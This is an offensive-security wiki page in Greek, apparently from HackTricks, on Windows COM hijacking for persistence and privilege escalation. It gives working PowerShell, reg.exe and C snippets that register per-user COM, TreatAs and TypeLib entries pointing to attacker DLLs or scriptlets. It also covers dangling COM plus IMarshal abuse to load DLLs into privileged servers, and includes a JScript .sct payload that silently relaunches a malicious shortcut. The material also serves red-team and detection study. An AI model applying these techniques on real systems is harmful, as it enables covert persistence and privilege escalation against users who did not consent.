# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Αναζήτηση ανύπαρκτων στοιχείων COM

Επειδή οι τιμές του HKCU μπορούν να τροποποιηθούν από τους χρήστες, το **COM Hijacking** μπορεί να χρησιμοποιηθεί ως **μηχανισμός persistence**. Με το `procmon` είναι εύκολο να εντοπιστούν μητρώα COM που αναζητούνται αλλά δεν υπάρχουν ακόμη και θα μπορούσαν να δημιουργηθούν από έναν attacker. Κλασικά φίλτρα:

- Λειτουργίες **RegOpenKey**.
- όπου το _Result_ είναι **NAME NOT FOUND**.
- και το _Path_ τελειώνει σε **InprocServer32**.

Χρήσιμες παραλλαγές κατά την αναζήτηση:

- Αναζητήστε επίσης κλειδιά **`LocalServer32`** που λείπουν. Ορισμένες κλάσεις COM είναι διακομιστές εκτός διεργασίας και θα εκκινήσουν ένα EXE που ελέγχεται από attacker, αντί για DLL.
- Αναζητήστε λειτουργίες μητρώου **`TreatAs`** και **`ScriptletURL`**, εκτός από το `InprocServer32`. Πρόσφατο περιεχόμενο ανίχνευσης και αναλύσεις malware αναφέρουν συχνά αυτά τα στοιχεία, επειδή είναι πολύ σπανιότερα από τις συνήθεις καταχωρίσεις COM και, επομένως, αποτελούν ισχυρό σήμα.
- Αντιγράψτε το νόμιμο **`ThreadingModel`** από το αρχικό `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32` κατά την κλωνοποίηση μιας καταχώρισης στο HKCU. Η χρήση λανθασμένου μοντέλου συχνά εμποδίζει την ενεργοποίηση και κάνει το hijack πιο εμφανές.<sup>[[3]](#references)</sup>
- Σε συστήματα 64-bit, ελέγξτε τόσο τις προβολές 64-bit όσο και 32-bit (`procmon.exe` έναντι `procmon64.exe`, `HKLM\Software\Classes` και `HKLM\Software\Classes\WOW6432Node`), επειδή οι εφαρμογές 32-bit ενδέχεται να επιλύουν διαφορετική καταχώριση COM.

Αφού αποφασίσετε ποιο ανύπαρκτο COM θα πλαστοπροσωπήσετε, εκτελέστε τις ακόλουθες εντολές. _Προσέξτε αν αποφασίσετε να πλαστοπροσωπήσετε ένα COM που φορτώνεται κάθε λίγα δευτερόλεπτα, καθώς αυτό μπορεί να είναι υπερβολικό._

```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```

### COM components του Task Scheduler που μπορούν να γίνουν hijack

Οι εργασίες των Windows χρησιμοποιούν Custom Triggers για να καλούν αντικείμενα COM και, επειδή εκτελούνται μέσω του Task Scheduler, είναι ευκολότερο να προβλέψουμε πότε θα ενεργοποιηθούν.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
  if ($Task.Actions.ClassId -ne $null)
  {
    if ($Task.Triggers.Enabled -eq $true)
    {
      $usersSid = "S-1-5-32-545"
      $usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

      if ($Task.Principal.GroupId -eq $usersGroup)
      {
        Write-Host "Task Name: " $Task.TaskName
        Write-Host "Task Path: " $Task.TaskPath
        Write-Host "CLSID: " $Task.Actions.ClassId
        Write-Host
      }
    }
  }
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Εξετάζοντας τα αποτελέσματα, μπορείτε, για παράδειγμα, να επιλέξετε μια εργασία που θα εκτελείται **κάθε φορά που συνδέεται ένας χρήστης**.

Στη συνέχεια, αναζητώντας το CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** στο **HKEY\CLASSES\ROOT\CLSID**, καθώς και στα HKLM και HKCU, συνήθως θα διαπιστώσετε ότι η τιμή δεν υπάρχει στο HKCU.

```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
               ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```

Έπειτα, μπορείς απλώς να δημιουργήσεις την εγγραφή HKCU και κάθε φορά που συνδέεται ο χρήστης, θα εκτελείται το backdoor σου.

## Αιωρούμενες εγγραφές COM και προσαρμοσμένο marshaling

Μια καταχώριση COM σε επίπεδο μηχανήματος μπορεί να αποτελέσει primitive για DLL planting χωρίς να αλλάξει το registry. Αναζήτησε μια τιμή `InprocServer32` της οποίας το DLL απουσιάζει και της οποίας την τελική διαδρομή μπορεί να δημιουργήσει ή να τροποποιήσει ένας χρήστης με χαμηλά δικαιώματα. Αν τοποθετήσεις ένα DLL με το ακριβές όνομα, κάθε διεργασία που ενεργοποιεί το CLSID θα φορτώσει κώδικα του επιτιθέμενου. Στο παράδειγμα CrossDevice, η καταχωρισμένη διαδρομή ήταν `%PROGRAMDATA%\CrossDevice\CrossDevice.Streaming.Source.dll`, οπότε ένας απλός χρήστης μπορούσε να δημιουργήσει τον φάκελο και το DLL που έλειπαν.<sup>[[5]](#references)</sup>

### Το `IMarshal` ως primitive φόρτωσης DLL μεταξύ διεργασιών

Κανονικά, το COM αναπαριστά έναν δείκτη διασύνδεσης με ένα τυπικό `OBJREF`, το οποίο παραπέμπει τον παραλήπτη πίσω στο αρχικό αντικείμενο. Ένα αντικείμενο που υλοποιεί το `IMarshal` μπορεί, αντί γι’ αυτό, να δημιουργήσει ένα προσαρμοσμένο `OBJREF`. Η μέθοδός του `GetUnmarshalClass` παρέχει το CLSID του κώδικα που θα ανακατασκευάσει το αντικείμενο στη διεργασία παραλαβής. Αυτό το CLSID δεν χρειάζεται να ταυτοποιεί το αρχικό αντικείμενο. Το COM το επιλύει ως διακομιστή εντός διεργασίας και φορτώνει το καταχωρισμένο DLL πριν καλέσει τη ζητούμενη μέθοδο διασύνδεσης.<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>

Μια ελάχιστη κακόβουλη υλοποίηση χρειάζεται μόνο να αντικαταστήσει το αιωρούμενο CLSID στη μέθοδο `GetUnmarshalClass`.<sup>[[5]](#references)</sup>

```c
HRESULT STDMETHODCALLTYPE GetUnmarshalClass(
    REFIID riid, void *pv, DWORD dest_context,
    void *dest_context_ptr, DWORD flags, CLSID *clsid) override
{
    return CLSIDFromString(L"{DANGLING-CLSID}", clsid);
}
```

Στείλτε αυτό το αντικείμενο μέσω μιας παραμέτρου proxied method, όπως η `[in] IUnknown *`. Μια άλλη επιλογή είναι η `CoGetInstanceFromIStorage`, με το αντικείμενο custom-marshaled να υλοποιεί επίσης αρκετά από το `IStorage`, ώστε να περνά τους τοπικούς ελέγχους. Το automatic unmarshaling στον remote server επιλύει το αντικατεστημένο CLSID, οπότε η DLL φορτώνεται πριν εκτελεστεί η μέθοδος-στόχος.<sup>[[5]](#references)</sup>

Το primitive δεν περιορίζεται σε registrations που λείπουν. Μπορεί επίσης να αναγκάσει τον receiver να φορτώσει μια υπάρχουσα DLL custom-unmarshaler και να εκθέσει σφάλματα στη διαδρομή φόρτωσης ή unmarshaling της.<sup>[[5]](#references)</sup>

Η αλυσίδα απαιτεί όλες τις ακόλουθες προϋποθέσεις:<sup>[[5]](#references)</sup>

1. Ένα CLSID ορατό σε επίπεδο μηχανήματος δείχνει σε μια DLL in-process που λείπει ή μπορεί να αντικατασταθεί.
2. Ο attacker μπορεί να τοποθετήσει αυτήν τη DLL στη διαδρομή που επιλύεται.
3. Ένας ενεργοποιήσιμος COM server out-of-process εκτελείται με το επιθυμητό επίπεδο προνομίων.
4. Ο server δέχεται custom marshaling και εκθέτει μια proxied κλήση που μεταφέρει το αντικείμενο του attacker πέρα από το όριο διεργασίας.

### Εύρεση dangling servers in-process

Τα [OleViewDotNet](https://github.com/tyranid/oleviewdotnet) και [NtObjectManager](https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools) μπορούν να απαριθμήσουν τη βάση δεδομένων COM του μηχανήματος και να δοκιμάσουν κάθε server μέσω της κανονικής επίλυσης module του Win32. Αυτό προτιμάται από το `Test-Path`, επειδή ορισμένα registrations περιέχουν μόνο ένα όνομα αρχείου και βασίζονται στη διαδρομή αναζήτησης του loader.<sup>[[5]](#references)</sup>

```powershell
function Test-ComServer($Server) {
    try {
        Use-NtObject ($lib = Import-Win32Module -Path $Server -Flags AsDataFile) { $true }
    } catch { $false }
}

$db = Get-ComDatabase -LoadMode MachineOnly
$classes = Get-ComClass -Database $db -ServerType InProcServer32
$classes | Where-Object { -not (Test-ComServer $_.DefaultServer) } |
    Sort-Object DefaultServer | Select-Object Name, DefaultServer
```

Αντιμετωπίστε το αποτέλεσμα ως λίστα υποψηφίων και όχι ως απόδειξη εκμεταλλευσιμότητας. Επιλύστε τη διαδρομή όπως κάνει ο loader και, στη συνέχεια, ελέγξτε το DACL του πρώτου υπάρχοντος γονικού καταλόγου και του DLL-στόχου, αν υπάρχει ήδη. Ένα αρχείο που λείπει είναι χρήσιμο μόνο αν ο attacker μπορεί να δημιουργήσει ή να αντικαταστήσει τη διαδρομή που θα επιλύσει πραγματικά το COM.<sup>[[5]](#references)</sup>

### Επιλέξτε και εκκινήστε έναν προνομιούχο receiver

Εξετάστε τις υποψήφιες κλάσεις COM για `RunAs`, συσχέτιση με υπηρεσία, διαθέσιμα interfaces και RPC proxies. Μια κλάση που έχει ρυθμιστεί για `SYSTEM`, αλλά δεν υποστηρίζεται από ονομασμένη υπηρεσία, ενδέχεται να αποτύχει στην άμεση ενεργοποίηση, επειδή το RPCSS δεν μπορεί να την εκκινήσει. Σε αυτή την περίπτωση, αναζητήστε ένα trigger χωρίς προνόμια που εκκινεί τον host της, όπως μια εκτελέσιμη προγραμματισμένη εργασία, και αναπαραγάγετε τυχόν προϋπόθεση named-event ή IPC που διατηρεί τον server σε λειτουργία.<sup>[[5]](#references)</sup>

Για παράδειγμα, η ευάλωτη αλυσίδα Shell Create Object Handler εκκινούσε τον host της δημιουργώντας το αναμενόμενο global event πριν καλέσει μια προγραμματισμένη εργασία που μπορούσε να εκτελέσει ο χρήστης.<sup>[[5]](#references)</sup>

```powershell
$ev = New-NtEvent -Win32Path 'Global\ShellCreateObjectTaskReadyEvent' -InitialState $false
Start-ScheduledTask -TaskPath '\Microsoft\Windows\Shell\' -TaskName 'CreateObjectTask'
$ev.Wait()
$object = New-ComObject -Clsid '135fd325-45b7-4c30-89f8-4386961669f0'
```

Αντιστοιχίστε την αναφορά αντικειμένου που προκύπτει με τον host της και επαληθεύστε τόσο την ταυτότητα όσο και την πολιτική marshaling. Στη συνέχεια, απαριθμήστε τα interfaces και μετατρέψτε τα proxies τους σε IDL, για να εντοπίσετε μια παράμετρο εισόδου, όπως `IUnknown *`, που θα κάνει marshal το fake object.<sup>[[5]](#references)</sup>

```powershell
$objref = Get-ComObjRef -Object $object
Get-ComProcess -ProcessId $objref.ProcessId |
    Select-Object Name, User, CustomMarshalAllowed

Get-ComInterface -Object $object
Get-ComInterface -Name '<interface>' | ConvertTo-ComSourceCode -Parse
```

### Προστασίες custom-marshaling

Ένας κατάλληλος παραλήπτης δεν πρέπει να απορρίπτει μη έμπιστους custom marshalers. Δύο προστασίες σε επίπεδο διεργασίας είναι το `EOAC_NO_CUSTOM_MARSHAL` στις δυνατότητες που περνιούνται στο `CoInitializeSecurity` και το `COMGLB_UNMARSHALING_POLICY_STRONG`, το οποίο ορίζεται μέσω του `IGlobalOptions::Set`. Όταν υπάρχουν διαθέσιμα symbols, η αντίστοιχη κατάσταση μπορεί να ελεγχθεί στα `combase!gCapabilities` και `combase!g_GLBOPT_UnmarshalingPolicy`. Το NtObjectManager εμφανίζει το αποτέλεσμα ως `CustomMarshalAllowed`, όταν ο parser διεργασιών του υποστηρίζει το συγκεκριμένο Windows build.<sup>[[5]](#references)</sup>

---

## COM TreatAs Hijacking + ScriptletURL

Το `TreatAs` επιτρέπει την προσομοίωση ενός CLSID από ένα άλλο.<sup>[[4]](#references)</sup> Από επιθετική σκοπιά, αυτό σημαίνει ότι μπορείς να αφήσεις το αρχικό CLSID ανέπαφο, να δημιουργήσεις ένα δεύτερο CLSID ανά χρήστη που δείχνει στο `scrobj.dll` και, στη συνέχεια, να ανακατευθύνεις το πραγματικό αντικείμενο COM στο κακόβουλο με το `HKCU\Software\Classes\CLSID\{Victim}\TreatAs`.

Αυτό είναι χρήσιμο όταν:

- η εφαρμογή-στόχος δημιουργεί ήδη ένα σταθερό CLSID κατά τη σύνδεση ή κατά την εκκίνηση της εφαρμογής
- θέλεις ανακατεύθυνση μόνο μέσω του registry, αντί να αντικαταστήσεις το αρχικό `InprocServer32`
- θέλεις να εκτελέσεις ένα τοπικό ή απομακρυσμένο scriptlet `.sct` μέσω της τιμής `ScriptletURL`

Παράδειγμα ροής εργασίας (προσαρμοσμένης από δημόσιες τεχνικές του Atomic Red Team και παλαιότερη έρευνα κατάχρησης του COM registry):

```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```

Σημειώσεις:

- Το `scrobj.dll` διαβάζει την τιμή `ScriptletURL` και εκτελεί το σχετικό `.sct`, οπότε μπορείτε να διατηρήσετε το payload ως τοπικό αρχείο ή να το ανακτήσετε απομακρυσμένα μέσω HTTP/HTTPS.
- Το `TreatAs` είναι ιδιαίτερα χρήσιμο όταν η αρχική καταχώριση COM είναι πλήρης και σταθερή στο HKLM, επειδή χρειάζεστε μόνο μια μικρή ανακατεύθυνση ανά χρήστη αντί να αντιγράψετε ολόκληρο το δέντρο.
- Για επικύρωση χωρίς να περιμένετε να ενεργοποιηθεί φυσικά, μπορείτε να δημιουργήσετε χειροκίνητα ένα στιγμιότυπο του fake ProgID/CLSID με `rundll32.exe -sta <ProgID-or-CLSID>`, εφόσον η κλάση-στόχος υποστηρίζει ενεργοποίηση STA.

## COM TypeLib Hijacking (script: moniker persistence)

Οι Type Libraries (TypeLib) ορίζουν διεπαφές COM και φορτώνονται μέσω της `LoadTypeLib()`. Όταν δημιουργείται στιγμιότυπο ενός COM server, το λειτουργικό σύστημα μπορεί επίσης να φορτώσει τη σχετική TypeLib, αναζητώντας κλειδιά μητρώου κάτω από το `HKCR\TypeLib\{LIBID}`. Αν η διαδρομή της TypeLib αντικατασταθεί με ένα **moniker**, π.χ. `script:C:\...\evil.sct`, τα Windows θα εκτελέσουν το scriptlet κατά την επίλυση της TypeLib — δημιουργώντας μια δυσδιάκριτη persistence που ενεργοποιείται όταν χρησιμοποιούνται συνήθη components.

Αυτό έχει παρατηρηθεί στην περίπτωση του Microsoft Web Browser control (το οποίο φορτώνεται συχνά από τον Internet Explorer, εφαρμογές που ενσωματώνουν το WebBrowser, ακόμη και από το `explorer.exe`).<sup>[[1]](#references)[[2]](#references)</sup>

### Βήματα (PowerShell)

1) Εντοπίστε την TypeLib (LIBID) που χρησιμοποιείται από ένα CLSID υψηλής συχνότητας. Παράδειγμα CLSID που χρησιμοποιείται συχνά από αλυσίδες malware: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).

```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```

2) Κατευθύνετε τη διαδρομή TypeLib ανά χρήστη σε ένα τοπικό scriptlet χρησιμοποιώντας το moniker `script:` (δεν απαιτούνται δικαιώματα διαχειριστή):

```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```

3) Τοποθέτησε ένα minimal JScript `.sct` που εκκινεί ξανά το κύριο payload σου (π.χ. ένα `.lnk` που χρησιμοποιήθηκε στην αρχική αλυσίδα):

```xml
<?xml version="1.0"?>
<scriptlet>
  <registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
  <script language="JScript">
    <![CDATA[
      try {
        var sh = new ActiveXObject('WScript.Shell');
        // Re-launch the malicious LNK for persistence
        var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
        sh.Run(cmd, 0, false);
      } catch(e) {}
    ]]>
  </script>
</scriptlet>
```

4) Ενεργοποίηση – το άνοιγμα του IE, μιας εφαρμογής που ενσωματώνει το control WebBrowser ή ακόμη και η συνήθης δραστηριότητα του Explorer θα φορτώσει το TypeLib και θα εκτελέσει το scriptlet, επανοπλίζοντας την αλυσίδα σας κατά τη σύνδεση/επανεκκίνηση.

Καθαρισμός
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```

Σημειώσεις
- Μπορείτε να εφαρμόσετε την ίδια λογική και σε άλλα COM components υψηλής συχνότητας· να επιλύετε πάντα πρώτα το πραγματικό `LIBID` από το `HKCR\CLSID\{CLSID}\TypeLib`.
- Σε συστήματα 64-bit μπορείτε επίσης να συμπληρώσετε το subkey `win64` για consumers 64-bit.

## References

- [1] [Υποκλέψτε το TypeLib – Νέα τεχνική persistence μέσω COM (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [2] [Check Point Research – Εκστρατεία ZipLine: Μια εξελιγμένη επίθεση phishing με στόχο εταιρείες των ΗΠΑ](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Επανεξέταση του COM Hijacking (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [4] [Κλειδί CLSID (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)
- [5] [Project Zero - Τεχνικές εκμετάλλευσης των Windows: Ορφανές εγγραφές COM Object](https://projectzero.google/2026/09/windows-dangling-com.html)
- [6] [Microsoft Learn - Διεπαφή IMarshal](https://learn.microsoft.com/en-us/windows/win32/api/objidl/nn-objidl-imarshal)
- [7] [Microsoft Open Specifications - MS-DCOM OBJREF](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/fe6c5e46-adf8-4e34-a8de-3f756c875f31)
{{#include ../../banners/hacktricks-training.md}}

